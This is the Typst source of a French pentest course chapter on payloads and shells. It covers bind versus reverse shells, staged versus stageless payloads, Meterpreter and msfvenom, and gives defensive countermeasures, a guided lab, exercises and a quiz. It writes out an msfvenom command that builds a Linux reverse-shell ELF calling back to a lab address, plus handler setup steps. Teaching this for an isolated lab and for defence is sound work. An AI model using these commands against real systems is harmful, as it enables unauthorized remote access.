#import "/00-common/template.typ": *
#show: chapter.with(
  module: "Exploitation",
  module-no: "13",
  chapter-no: "64",
  title: "Charges utiles & shells",
  subtitle: "Ce qui s'exécute après la faille — et comment on le repère.",
  volume: "Vol. III — Offensif",
)
#show table: set par(justify: false)

// Schéma : bind shell vs reverse shell
#let poste(t, col) = box(width: 100%, height: 1.5cm, fill: col, stroke: 0.6pt + slate,
  radius: 3pt, inset: 6pt, align(center + horizon,
    text(font: "IBM Plex Sans SmBld", size: 9pt, fill: ink)[#t]))
#let sens(txt) = align(center, text(size: 7.5pt, fill: brick)[#txt])

= Charges utiles & shells

Le chapitre 62 a distingué l'*exploit* (la méthode) de la *charge utile* (ce qui s'exécute ensuite).
Ce chapitre détaille la charge utile : ses formes, la différence entre un accès « bind » et un accès
« reverse », ce qu'est Meterpreter, et comment une charge se fabrique avec `msfvenom`. Comme toujours
dans ce module, la finalité est double : savoir mener un test maîtrisé *et* reconnaître ces charges
du point de vue de la défense.

#alerte[Une charge utile *exécute du code sur un système*. On n'en produit et on n'en déclenche que
dans le *laboratoire isolé* (`192.168.56.0/24`) ou sur un périmètre dont les règles d'engagement
l'autorisent explicitement. Les charges générées dans ce chapitre restent sur le réseau host-only et
ne visent que la VM cible. Fabriquer ou diffuser une charge contre un tiers est une infraction
(chapitre 3) ; ce n'est jamais l'objet de ce cours.]

#note[Objectifs : comprendre ce qu'est une charge utile, distinguer _bind_ et _reverse_, _staged_ et
_stageless_, situer Meterpreter, lire une commande `msfvenom`, et connaître les traces défensives.
Prérequis : chapitres 62 (anatomie), 63 (Metasploit) et 36 (réseau, connexions TCP).]

== 64.1 — Qu'est-ce qu'une charge utile

Une charge utile est le *code transporté par l'exploit et exécuté sur la cible* une fois la faille
déclenchée. L'exploit ouvre la porte ; la charge décide de ce qu'on fait une fois entré. Les objectifs
usuels en pentest sont modestes et *proportionnés* : obtenir un interpréteur de commandes pour
démontrer l'accès, exécuter une commande unique de preuve, ou établir une session gérable.

#conseil[La charge la plus « puissante » n'est pas la meilleure : on choisit la plus *sobre* qui
démontre l'impact attendu (chapitre 62). Une simple exécution de `id` suffit souvent à prouver un
accès, sans ouvrir de canal interactif.]

== 64.2 — Bind shell contre reverse shell

C'est la distinction fondamentale, et elle est *réseau*. Qui initie la connexion ?

#figura(caption: "Bind shell : la cible écoute. Reverse shell : la cible se connecte au testeur.")[
  #block(breakable: false, grid(columns: (1fr, 1.2cm, 1fr), gutter: 6pt, align: center + horizon,
    poste("Testeur", brick.lighten(88%)), sens[→ se connecte], poste("Cible (écoute)", slate.lighten(90%)),
    grid.cell(colspan: 3, align(center, text(size: 7.5pt, fill: slate)[_Bind_ : la cible ouvre un port et attend.])),
    poste("Testeur (écoute)", brick.lighten(88%)), sens[← se connecte], poste("Cible", slate.lighten(90%)),
    grid.cell(colspan: 3, align(center, text(size: 7.5pt, fill: slate)[_Reverse_ : la cible rappelle le testeur.]))))
]

#table(columns: (3.2cm, 1fr, 1fr),
  table.header([TYPE], [FONCTIONNEMENT], [EN PRATIQUE]),
  [_Bind_], [La cible ouvre un port d'écoute ; le testeur s'y connecte.], [Échoue si un pare-feu filtre les ports entrants (le cas courant).],
  [_Reverse_], [Le testeur écoute ; la cible se connecte à lui (`LHOST`/`LPORT`).], [Passe plus souvent, car le trafic *sortant* est moins filtré.],
)

#defense[C'est précisément pourquoi le _reverse shell_ domine : les pare-feu surveillent surtout le
trafic *entrant*. La contre-mesure défensive est donc le *filtrage sortant* (_egress filtering_) : un
serveur n'a aucune raison d'initier une connexion vers une adresse arbitraire sur un port quelconque.
Restreindre et journaliser les connexions sortantes coupe la plupart des _reverse shells_.]

== 64.3 — Staged contre stageless

Une charge peut être livrée en un bloc ou en deux temps :

#table(columns: (3.4cm, 1fr),
  table.header([FORME], [PRINCIPE]),
  [_Stageless_ (non étagée)], [Toute la charge est envoyée d'un coup. Plus grosse, mais autonome et simple.],
  [_Staged_ (étagée)], [Un petit « amorce » (_stager_) est envoyé d'abord ; il télécharge ensuite le reste (_stage_).],
)

La convention de nommage dans Metasploit le signale par la ponctuation : un `/` sépare les étages.
Ainsi `linux/x64/shell_reverse_tcp` est _stageless_ (le `_` lie les mots d'un seul bloc), tandis que
`linux/x64/meterpreter/reverse_tcp` est _staged_ (le `/` avant `reverse_tcp` marque le second étage).

#conseil[Le choix a des effets concrets : une charge _staged_ est plus petite (utile quand l'espace
est contraint) mais nécessite un second échange réseau — donc une occasion de détection
supplémentaire, et une sensibilité aux coupures. En lab, on observe les deux pour comprendre la
différence de trafic.]

== 64.4 — Meterpreter : une charge utile avancée

Meterpreter est la charge utile emblématique de Metasploit. Au lieu d'un simple interpréteur, elle
offre une *interface riche* qui s'exécute en mémoire. Son intérêt pédagogique est de montrer ce qu'une
charge moderne peut faire — et donc ce qu'un défenseur doit pouvoir repérer.

#table(columns: (3.4cm, 1fr),
  table.header([CARACTÉRISTIQUE], [EXPLICATION]),
  [En mémoire], [S'exécute sans nécessairement écrire de fichier sur le disque — plus discret.],
  [Chiffré], [Le canal de communication est chiffré par défaut.],
  [Extensible], [Des modules (`stdapi`, `priv`…) ajoutent des commandes à la demande.],
  [Multiplateforme], [Des variantes existent pour Linux, Windows, et d'autres.],
)

Quelques commandes *de session* (à n'employer qu'en lab, après un accès légitimement obtenu) :
`sysinfo` (informations système), `getuid` (identité courante), `ps` (processus), `background`
(mettre la session de côté). On ne détaille pas ici les actions de post-exploitation, traitées au
Module 15 sous l'angle « bonnes pratiques et restitution ».

#defense[« En mémoire » ne veut pas dire « invisible ». Les EDR modernes détectent l'injection de code,
les comportements anormaux d'un processus, et le trafic chiffré sortant inattendu. La journalisation
de la création de processus (par ex. Sysmon sous Windows, auditd sous Linux) reste un pilier de la
détection — sujet du Module 25.]

== 64.5 — msfvenom : fabriquer une charge

`msfvenom` est l'outil en ligne de commande qui génère des charges utiles autonomes (par ex. pour
un test où la charge doit exister comme fichier). Anatomie d'une commande *d'exemple, pour le lab* :

```text
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.56.10 LPORT=4444 \
  -f elf -o /tmp/lab_payload.elf
```

#table(columns: (3.8cm, 1fr),
  table.header([PARAMÈTRE], [RÔLE]),
  [`-p <payload>`], [La charge utile choisie (ici un _reverse shell_ Linux).],
  [`LHOST` / `LPORT`], [Adresse et port d'écoute du testeur (le Kali du lab).],
  [`-f <format>`], [Le format de sortie (`elf`, `raw`, `python`…). Lister : `--list formats`.],
  [`-o <fichier>`], [Le fichier de sortie.],
  [`-e <encoder>`], [Encodeur facultatif (compatibilité, non une garantie d'évasion).],
  [`-b <octets>`], [Octets à éviter (_bad chars_), utile en corruption mémoire (chapitre 66).],
)

#alerte[L'encodage (`-e`) sert surtout la *compatibilité* (éviter des octets interdits), pas à
« échapper aux antivirus » : les encodeurs classiques comme `shikata_ga_nai` sont parfaitement connus
des défenses modernes. Présenter l'encodage comme une évasion fiable est une erreur technique — et
l'évasion offensive sort du cadre de ce cours (abordée sous l'angle défensif au Module 24).]

== 64.6 — Du côté de l'écoute : le handler

Une charge _reverse_ suppose que le testeur *écoute*. Dans Metasploit, c'est le module
`exploit/multi/handler`, configuré avec le *même* `PAYLOAD`, `LHOST` et `LPORT` que la charge générée.
Sans correspondance exacte, l'accès renvoyé n'aboutit pas. C'est un point de confusion fréquent : la
charge et le _handler_ sont les deux moitiés d'un même accord, et doivent coïncider.

== 64.7 — Synthèse défensive

#defense[Les charges utiles de ce chapitre se neutralisent et se détectent par des mesures de fond,
indépendantes du nom de l'outil :
- *Filtrage sortant* strict : couper les _reverse shells_ à la racine.
- *Segmentation* : une cible compromise ne doit pas pouvoir joindre tout le réseau.
- *EDR et journalisation* de la création de processus et des injections (Sysmon, auditd).
- *IDS/IPS* à jour pour les signatures de charges connues, et *détection d'anomalies* pour les charges
  chiffrées ou inédites.
- *Moindre privilège* : une charge hérite des droits du service — les limiter limite l'impact (chapitre 62).
Aucune de ces mesures ne cible « Metasploit » : elles visent les *comportements* que produit toute
charge utile.]

== 64.8 — Repères : quelques charges courantes

Tableau de lecture, non de recettes : il sert à *reconnaître* un nom de charge dans un module ou une
alerte, et à en déduire la forme et le canal. Toujours à n'employer qu'en lab.

#table(columns: (5.4cm, 1.7cm, 1.7cm, 1fr),
  table.header([NOM (EXEMPLE)], [FORME], [SENS], [CANAL]),
  [`shell_reverse_tcp`], [stageless], [reverse], [TCP brut],
  [`shell/bind_tcp`], [staged], [bind], [TCP brut],
  [`meterpreter/reverse_tcp`], [staged], [reverse], [TCP (Meterpreter)],
  [`meterpreter/reverse_https`], [staged], [reverse], [HTTPS (se fond dans le trafic web)],
  [`meterpreter_reverse_tcp`], [stageless], [reverse], [TCP (Meterpreter)],
)

#defense[La variante `reverse_https` illustre pourquoi le seul filtrage par port est insuffisant :
une charge qui sort en 443 ressemble à du trafic web légitime. D'où l'importance de l'*inspection*
(proxy, journalisation des destinations) et de la *détection d'anomalies* plutôt que de la seule règle
de port — on y revient au Module 25.]

== Lab guidé — Observer un accès renvoyé, de bout en bout (lab isolé)

Matériel : Kali (`192.168.56.10`), une VM Linux cible du lab (`192.168.56.20`), réseau host-only
*sans accès Internet*. Objectif pédagogique : *voir* le trafic d'un _reverse shell_ et sa trace, pas
« pirater ». Durée : 1 h 30.

#lab[
+ Sur le Kali, générez une charge de test avec `msfvenom` (commande du §64.5), format `elf`, vers
  `/tmp/lab_payload.elf`. Examinez sa taille et son format (`file /tmp/lab_payload.elf`).
+ Lancez le _handler_ : dans `msfconsole`, `use exploit/multi/handler`, réglez `PAYLOAD`,
  `LHOST 192.168.56.10`, `LPORT 4444`, puis `run`.
+ Transférez la charge sur la VM *cible du lab* par un canal du lab (partage, `scp`) — vous agissez
  ici sur *votre propre* machine de laboratoire, ce qui simule le moment « après l'exploit ».
+ En parallèle, capturez le trafic sur le Kali : `sudo tcpdump -i <iface> port 4444 -w /tmp/rev.pcap`.
+ Exécutez la charge sur la cible du lab et observez l'ouverture de la session côté _handler_.
  Exécutez `id` puis fermez la session (`exit`).
+ Ouvrez la capture (`wireshark /tmp/rev.pcap`) : identifiez *qui initie la connexion* et sur quel port.
+ Rédigez la fiche défensive : quelle *règle de filtrage sortant* aurait bloqué cet accès, et quelle
  *trace* un SIEM aurait vue (connexion sortante inhabituelle, création de processus).
]

== Exercices

+ *(Niveau 1)* Définissez « charge utile » et donnez deux objectifs proportionnés en pentest.
+ *(Niveau 1)* Dans un _reverse shell_, qui écoute : le testeur ou la cible ?
+ *(Niveau 2)* Pourquoi un _reverse shell_ passe-t-il plus souvent qu'un _bind shell_ ? Quelle
  contre-mesure l'en empêche ?
+ *(Niveau 2)* Distinguez une charge _staged_ d'une charge _stageless_, et donnez l'indice de nommage
  dans Metasploit.
+ *(Niveau 3)* Un collègue affirme qu'encoder une charge avec `shikata_ga_nai` « la rend indétectable ».
  Que lui répondez-vous, techniquement ?

=== Corrigés détaillés

+ Le code transporté par l'exploit et exécuté sur la cible après le déclenchement de la faille.
  Objectifs proportionnés : exécuter une commande unique de preuve (ex. `id`), ou ouvrir une session
  pour démontrer l'accès — rien de plus que nécessaire.
+ Le *testeur* écoute ; la *cible* se connecte à lui (`LHOST`/`LPORT`).
+ Parce que les pare-feu filtrent surtout le trafic *entrant* ; une connexion *sortante* de la cible
  est plus souvent permise. Contre-mesure : le *filtrage sortant* (_egress filtering_), qui restreint
  et journalise les connexions initiées par les serveurs.
+ _Stageless_ : toute la charge est envoyée d'un coup (autonome, plus grosse). _Staged_ : une amorce
  est envoyée, puis télécharge le reste (plus petite, un échange de plus). Indice : dans Metasploit,
  le `/` avant le dernier segment (`meterpreter/reverse_tcp`) marque une charge _staged_ ; un nom lié
  par `_` (`shell_reverse_tcp`) est _stageless_.
+ C'est faux : `shikata_ga_nai` est un encodeur *connu de longue date*, dont la signature et le
  comportement de décodage sont largement détectés. L'encodage sert la compatibilité (éviter des
  octets interdits), pas l'évasion. Les défenses modernes (EDR, analyse comportementale) ne se
  limitent pas aux signatures statiques.

== Résumé du chapitre

- La charge utile est le code exécuté sur la cible après la faille ; on choisit la plus *sobre* qui
  démontre l'impact.
- _Bind_ : la cible écoute. _Reverse_ : la cible rappelle le testeur — plus efficace car le trafic
  sortant est moins filtré.
- _Stageless_ : envoyée d'un bloc. _Staged_ : amorce puis téléchargement ; le `/` de nommage le signale.
- Meterpreter est une charge avancée en mémoire, chiffrée et extensible — détectable malgré tout.
- `msfvenom` génère des charges autonomes ; l'encodage sert la compatibilité, pas l'évasion.
- Défense : filtrage sortant, segmentation, EDR et journalisation, moindre privilège.

== Quiz

+ Dans un _bind shell_, qui ouvre le port d'écoute ?
+ Quelle contre-mesure défensive vise directement les _reverse shells_ ?
+ Que signifie le `/` dans `meterpreter/reverse_tcp` quant à la forme de la charge ?
+ À quoi sert réellement l'encodage d'une charge avec `msfvenom` ?
+ Quel module de Metasploit joue le rôle d'écoute pour un accès renvoyé ?

=== Corrigé du quiz

+ La *cible* ouvre le port et attend ; le testeur s'y connecte.
+ Le *filtrage sortant* (_egress filtering_) : restreindre et journaliser les connexions initiées par
  les serveurs.
+ C'est une charge _staged_ (étagée) : une amorce est envoyée d'abord, puis le reste est téléchargé.
+ À assurer la *compatibilité* (éviter des octets interdits), non à garantir une évasion des défenses.
+ `exploit/multi/handler`, configuré avec le même `PAYLOAD`, `LHOST` et `LPORT` que la charge.

== Sources & références

Sources consultées (vérifiées le 17 novembre 2026) :

- Rapid7 — _msfvenom_ et _Working with Payloads_ : #link("https://docs.metasploit.com")[docs.metasploit.com]
- Offensive Security — _Metasploit Unleashed_ (payloads, Meterpreter) : #link("https://www.offsec.com/metasploit-unleashed/")[offsec.com/metasploit-unleashed]
- MITRE ATT&CK — _Ingress Tool Transfer_ (T1105), _Application Layer Protocol_ (T1071) : #link("https://attack.mitre.org")[attack.mitre.org]
- MITRE ATT&CK — _Non-Standard Port_ (T1571) : #link("https://attack.mitre.org/techniques/T1571/")[attack.mitre.org]
- NIST — _SP 800-41_ (lignes directrices sur les pare-feu, filtrage sortant) : #link("https://csrc.nist.gov")[csrc.nist.gov]
